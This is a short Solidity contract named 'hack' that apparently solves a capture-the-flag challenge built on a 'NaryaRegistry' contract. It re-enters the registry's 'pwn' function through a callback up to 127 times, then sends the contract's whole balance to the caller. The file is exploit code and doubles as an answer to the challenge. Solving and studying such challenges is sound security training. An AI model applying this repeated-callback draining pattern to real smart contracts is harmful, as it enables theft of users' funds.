// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "../../lib/ctf/NaryaRegistry/contracts/NaryaRegistry.sol";


contract hack {
    NaryaRegistry public registry;
    uint256 public count;

    constructor(address _registry) {
        registry = NaryaRegistry(_registry);
    }

    function register() external {
        registry.register();
    }

    function attack(uint256 _amount) external {
        count = 0; 
        registry.pwn(_amount); 
    }

    function PwnedNoMore(uint256 _amount) external {
        if (count < 127) { 
            count++; 
            registry.pwn(_amount); 
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}